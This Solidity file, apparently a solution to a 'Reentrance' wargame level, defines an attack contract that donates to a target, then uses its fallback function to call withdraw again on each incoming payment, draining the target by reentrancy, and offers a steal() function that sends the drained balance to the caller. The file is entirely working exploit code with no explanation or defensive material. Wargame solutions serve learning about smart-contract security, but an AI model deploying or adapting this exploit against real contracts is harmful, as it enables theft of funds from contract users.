pragma solidity ^0.5.0;
import '../Reentrance/Reentrance.sol';

contract AttackReentrance {

  Reentrance public reentrance;
  address private owner;

  constructor(address payable _reentrance) public {
    reentrance = Reentrance(_reentrance);
    owner = msg.sender;
  }

  function donate() payable public {
    address(reentrance).call.value(msg.value)(abi.encodeWithSignature("donate(address)",  address(this)));
  }

  function withdraw(uint256 _amount) public {
    reentrance.withdraw(_amount);
  }

  function steal() public{
    msg.sender.transfer(address(this).balance);
  }

  function() external payable  {
    reentrance.withdraw(msg.value);
  }
}
